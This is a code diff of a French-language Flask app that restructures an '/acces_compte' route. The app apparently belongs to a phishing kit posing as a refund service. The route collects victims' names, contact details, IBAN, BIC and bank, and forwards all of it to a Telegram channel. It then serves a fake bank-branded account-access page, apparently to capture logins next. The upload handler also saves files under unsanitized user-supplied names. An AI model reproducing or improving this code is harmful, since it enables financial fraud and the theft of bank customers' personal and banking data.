@@ -33,57 +33,61 @@ def formulaire_remboursement():
     return render_template("formulaire_de_remboursement.html")
 
 # Route pour traiter la soumission du formulaire de remboursement
-@app.route("/acces_compte", methods=["POST"])
+@app.route("/acces_compte", methods=["GET", "POST"])
 def acces_compte():
-    # Récupérer les fichiers téléversés
-    if "proof_of_purchase" in request.files:
-        file = request.files["proof_of_purchase"]
-        if file.filename != "":
-            file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
-            try:
-                file.save(file_path)
-                print(f"Fichier sauvegardé : {file_path}")
-            except Exception as e:
-                print(f"Erreur lors de l'enregistrement du fichier : {e}")
+    if request.method == "POST":
+        # Récupérer les fichiers téléversés
+        if "proof_of_purchase" in request.files:
+            file = request.files["proof_of_purchase"]
+            if file.filename != "":
+                file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
+                try:
+                    file.save(file_path)
+                    print(f"Fichier sauvegardé : {file_path}")
+                except Exception as e:
+                    print(f"Erreur lors de l'enregistrement du fichier : {e}")
 
-    # Récupérer les autres données du formulaire
-    nom = request.form.get("nom")
-    prenom = request.form.get("prenom")
-    email = request.form.get("email")
-    phone = request.form.get("phone")
-    order_number = request.form.get("order_number")
-    purchase_date = request.form.get("purchase_date")
-    products = request.form.get("products")
-    refund_reason = request.form.get("refund_reason")
-    iban = request.form.get("iban")
-    bic = request.form.get("bic")
-    bank = request.form.get("bank")
-    bank_logo_url = request.form.get("bank_logo_url")
+        # Récupérer les autres données du formulaire
+        nom = request.form.get("nom")
+        prenom = request.form.get("prenom")
+        email = request.form.get("email")
+        phone = request.form.get("phone")
+        order_number = request.form.get("order_number")
+        purchase_date = request.form.get("purchase_date")
+        products = request.form.get("products")
+        refund_reason = request.form.get("refund_reason")
+        iban = request.form.get("iban")
+        bic = request.form.get("bic")
+        bank = request.form.get("bank")
+        bank_logo_url = request.form.get("bank_logo_url")
 
-    # Validation des champs obligatoires
-    if not nom or not prenom or not order_number or not iban or not bic:
-        return "Veuillez remplir tous les champs obligatoires.", 400
+        # Validation des champs obligatoires
+        if not nom or not prenom or not order_number or not iban or not bic:
+            return "Veuillez remplir tous les champs obligatoires.", 400
 
-    # Envoyer les informations à Telegram
-    message = (
-        "Nouvelle demande de remboursement :\n"
-        f"Nom : {nom}\n"
-        f"Prénom : {prenom}\n"
-        f"Email : {email}\n"
-        f"Téléphone : {phone}\n"
-        f"Numéro de commande : {order_number}\n"
-        f"Date d'achat : {purchase_date}\n"
-        f"Produits concernés : {products}\n"
-        f"Raison du remboursement : {refund_reason}\n"
-        f"IBAN : {iban}\n"
-        f"BIC : {bic}\n"
-        f"Banque : {bank}\n"
-        f"Logo de la banque : {bank_logo_url}"
-    )
-    send_to_telegram(message)
+        # Envoyer les informations à Telegram
+        message = (
+            "Nouvelle demande de remboursement :\n"
+            f"Nom : {nom}\n"
+            f"Prénom : {prenom}\n"
+            f"Email : {email}\n"
+            f"Téléphone : {phone}\n"
+            f"Numéro de commande : {order_number}\n"
+            f"Date d'achat : {purchase_date}\n"
+            f"Produits concernés : {products}\n"
+            f"Raison du remboursement : {refund_reason}\n"
+            f"IBAN : {iban}\n"
+            f"BIC : {bic}\n"
+            f"Banque : {bank}\n"
+            f"Logo de la banque : {bank_logo_url}"
+        )
+        send_to_telegram(message)
 
-    # Rediriger vers la page d'accès au compte avec le logo de la banque
-    return render_template("acces_compte.html", bank_logo_url=bank_logo_url)
+        # Rediriger vers la page d'accès au compte avec le logo de la banque
+        return render_template("acces_compte.html", bank_logo_url=bank_logo_url)
+    else:
+        # Afficher la page d'accès au compte (requête GET)
+        return render_template("acces_compte.html")
 
 # Route pour traiter la soumission de la page d'accès au compte
 @app.route("/confirmation", methods=["POST"])
